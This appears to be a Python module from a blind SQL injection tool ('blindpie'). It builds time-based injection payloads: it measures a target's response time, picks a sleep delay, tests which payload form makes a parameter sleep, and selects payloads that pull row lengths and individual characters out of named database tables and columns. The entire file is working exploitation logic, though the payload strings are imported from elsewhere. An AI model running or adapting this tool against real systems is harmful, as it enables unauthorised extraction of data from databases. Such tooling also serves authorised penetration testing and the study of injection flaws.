import logging
from abc import ABC, abstractmethod
from typing import List, Tuple
from copy import copy, deepcopy
from blindpie.target import ITarget
from blindpie.request import IRequest
from blindpie.defaults import *


LOGGER = logging.getLogger(__name__)


class UnexploitableParameterException(Exception):
    """Exception thrown when a parameter seems to be not exploitable.
    """

    def __init__(self, param: str):
        """Instantiates the exception from the parameter not-exploitable.

        :param param: str -- the parameter which doesn't seem to be exploitable
        """

        self.__param = param

    def __str__(self):

        return "Parameter '{:s}' doesn't seem to be exploitable".format(self.__param)


class IPayloadBuilder(ABC):
    """An interface to build blind-SQLi payloads.
    """

    @abstractmethod
    def set_threshold(self, threshold: float = DEFAULT_THRESHOLD) -> 'IPayloadBuilder':
        """Sets the threshold used to decide the sleep time.

        The threshold must be greater than 1.

        :param threshold: float -- the threshold to use
        :return: IPayloadBuilder -- this payload builder using the new threshold
        """

        pass

    @abstractmethod
    def get_threshold(self) -> float:
        """Returns the threshold.

        :return: float -- the current threshold
        """

        pass

    @abstractmethod
    def get_sleep_time(self, default_request: IRequest) -> float:
        """Returns the sleep time.

        :param default_request: IRequest -- a request containing the default
            values
        :return: float -- the sleep time in ms
        """

        pass

    @abstractmethod
    def get_reference_resp_time(self, default_request: IRequest) -> float:
        """Returns the target reference response time.

        :param default_request: IRequest -- a request containing the default
            values
        :return: float -- the reference response time in ms
        """

        pass

    @abstractmethod
    def get_test_payload(self, default_request: IRequest, param: str, max_interval: int = DEFAULT_MAX_INTERVAL,
                         max_threads: int = DEFAULT_MAX_THREADS) -> str:
        """Returns the payload to test for blind-SQLi vulnerability.

        The payload is a string with the following placeholders:

        - sleep_time -- the sleep time in seconds

        :param default_request: IRequest -- a request containing the default
            values
        :param param: str -- the name of the vulnerable parameter to exploit
        :param max_interval: int -- the max time to wait between each request in
            ms
        :param max_threads: int -- the max number of threads to use concurrently
        :return: str -- the SQLi payload
        """

        pass

    @abstractmethod
    def get_fetch_char_payload(self, default_request: IRequest, param: str, max_interval: int = DEFAULT_MAX_INTERVAL,
                               max_threads: int = DEFAULT_MAX_THREADS) -> str:
        """Returns the payload to fetch a character in a position of a row.

        The payload is a string with the following placeholders:

        - column_name -- the name of the column to fetch from
        - table_name -- the name of the table to fetch from
        - row_index -- the index of the row to fetch from
        - char_index -- the position of the char to fetch
        - condition -- the condition to check
        - value -- the value to check
        - sleep_time -- the sleep time in seconds

        :param default_request: IRequest -- a request containing the default
            values
        :param param: str -- the name of the vulnerable parameter to exploit
        :param max_interval: int -- the max time to wait between each request in
            ms
        :param max_threads: int -- the max number of threads to use concurrently
        :return: str -- the SQLi payload
        """

        pass

    @abstractmethod
    def get_fetch_row_length_payload(self, default_request: IRequest, param: str, max_interval: int = DEFAULT_MAX_INTERVAL,
                                     max_threads: int = DEFAULT_MAX_THREADS) -> str:
        """Returns the payload to fetch the length of a row.

        The payload is a string with the following placeholders:

        - column_name -- the name of the column to fetch from
        - table_name -- the name of the table to fetch from
        - row_index -- the index of the row to fetch from
        - condition -- the condition to check
        - value -- the value to check
        - sleep_time -- the sleep time in seconds

        :param default_request: IRequest -- a request containing the default
            values
        :param param: str -- the name of the vulnerable parameter to exploit
        :param max_interval: int -- the max time to wait between each request in
            ms
        :param max_threads: int -- the max number of threads to use concurrently
        :return: str -- the SQLi payload
        """

        pass

    @staticmethod
    @abstractmethod
    def get_columns_concat(columns: List[str]) -> Tuple[str, str]:
        """Returns the string to use as column name in a SQLi payload and the
        separator which was used.

        :param columns: List[str] -- the names of the columns to concat
        :return: Tuple[str, str] -- the couple (column name, separator)
        """

        pass


class PayloadBuilder(IPayloadBuilder):
    """A concrete implementation of a payload builder.
    """

    def __init__(self, target: ITarget, threshold: float = DEFAULT_THRESHOLD):
        """Instantiates the payload builder.

        :param target: ITarget -- the target of the requests
        :param threshold: float -- threshold value used to decide the sleep time
        """

        self.__target: ITarget = target
        self.__threshold: float = threshold

        self.__reference_resp_time_ms: float = None
        self.__sleep_time_ms: float = None
        self.__param: str = None
        """The last parameter used"""
        self.__test_payload: str = None
        self.__fetch_char_payload: str = None
        self.__fetch_row_length_payload: str = None

    def build_sleep_time(self, default_request: IRequest) -> None:
        """Decides for how long the target must sleep if an answer is
        affirmative.

        :param default_request: IRequest -- a request containing the default
            values
        """

        if self.__sleep_time_ms is None:
            self.__reference_resp_time_ms = self.__target.get_response_time(default_request)
            self.__sleep_time_ms = self.__reference_resp_time_ms * self.__threshold
        logging.debug("Reference response time: {:f} ms".format(self.__reference_resp_time_ms))
        logging.debug("Sleep time: {:f} ms".format(self.__sleep_time_ms))

    def build_payloads(self, default_request: IRequest, param: str, max_interval: int = DEFAULT_MAX_INTERVAL,
                       max_threads: int = DEFAULT_MAX_THREADS) -> None:
        """Decides which payloads to use for a parameter.

        :param default_request: IRequest -- a request containing the default values
        :param param: str -- the name of the vulnerable parameter to exploit
        :param max_interval: int -- the max time to wait between each request, in ms
        :param max_threads: int -- the max number of threads to use concurrently
        """

        # Use cached values if it's the same parameter:
        if self.__param is not None and self.__param == param:
            return

        sleep_time_s = self.get_sleep_time(default_request=default_request) / 1000

        requests: List[IRequest] = list()

        params = copy(default_request.get_params())
        params[param] = DEFAULT_TEST_PAYLOADS[0].format(sleep_time=sleep_time_s)
        requests.append(deepcopy(default_request).set_params(params))

        params = copy(default_request.get_params())
        params[param] = DEFAULT_TEST_PAYLOADS[1].format(sleep_time=sleep_time_s)
        requests.append(deepcopy(default_request).set_params(params))

        logging.debug("Requests: [{:s}]".format('; '.join([str(r) for r in requests])))

        response_times = self.__target.get_response_times(requests_=requests, max_interval=max_interval, max_threads=max_threads)
        logging.debug("Response times: {:s}".format(str(response_times)))

        if response_times[0] >= self.get_sleep_time(default_request=default_request):
            self.__test_payload = DEFAULT_TEST_PAYLOADS[0]
            self.__fetch_char_payload = DEFAULT_FETCH_CHAR_PAYLOADS[0]
            self.__fetch_row_length_payload = DEFAULT_FETCH_ROW_LENGTH_PAYLOADS[0]
            logging.debug("Parameter '{:s}' seems to be vulnerable to payload '{:s}'".format(param, DEFAULT_TEST_PAYLOADS[0]))
        elif response_times[1] >= self.get_sleep_time(default_request=default_request):
            self.__test_payload = DEFAULT_TEST_PAYLOADS[1]
            self.__fetch_char_payload = DEFAULT_FETCH_CHAR_PAYLOADS[1]
            self.__fetch_row_length_payload = DEFAULT_FETCH_ROW_LENGTH_PAYLOADS[1]
            logging.debug("Parameter '{:s}' seems to be vulnerable to payload '{:s}'".format(param, DEFAULT_TEST_PAYLOADS[1]))
        else:
            raise UnexploitableParameterException(param=param)

        self.__param = param

    def set_threshold(self, threshold: float = DEFAULT_THRESHOLD) -> IPayloadBuilder:

        self.__threshold = threshold
        return self

    def get_threshold(self) -> float:

        return self.__threshold

    def get_sleep_time(self, default_request: IRequest) -> float:

        self.build_sleep_time(default_request=default_request)
        return self.__sleep_time_ms

    def get_reference_resp_time(self, default_request: IRequest) -> float:

        self.build_sleep_time(default_request=default_request)
        return self.__reference_resp_time_ms

    def get_test_payload(self, default_request: IRequest, param: str, max_interval: int = DEFAULT_MAX_INTERVAL,
                         max_threads: int = DEFAULT_MAX_THREADS) -> str:

        self.build_payloads(default_request=default_request, param=param, max_interval=max_interval, max_threads=max_threads)
        return self.__test_payload

    def get_fetch_char_payload(self, default_request: IRequest, param: str, max_interval: int = DEFAULT_MAX_INTERVAL,
                               max_threads: int = DEFAULT_MAX_THREADS) -> str:

        self.build_payloads(default_request=default_request, param=param, max_interval=max_interval, max_threads=max_threads)
        return self.__fetch_char_payload

    def get_fetch_row_length_payload(self, default_request: IRequest, param: str,
                                     max_interval: int = DEFAULT_MAX_INTERVAL,
                                     max_threads: int = DEFAULT_MAX_THREADS) -> str:

        self.build_payloads(default_request=default_request, param=param, max_interval=max_interval, max_threads=max_threads)
        return self.__fetch_row_length_payload

    @staticmethod
    def get_columns_concat(columns: List[str]) -> Tuple[str, str]:

        column = columns[0] if len(columns) == 1 else "concat({:s})".format(','.join([c if i == len(columns) - 1 else c + ',char(9)' for i, c in enumerate(columns)]))
        separator = '\t'

        return column, separator
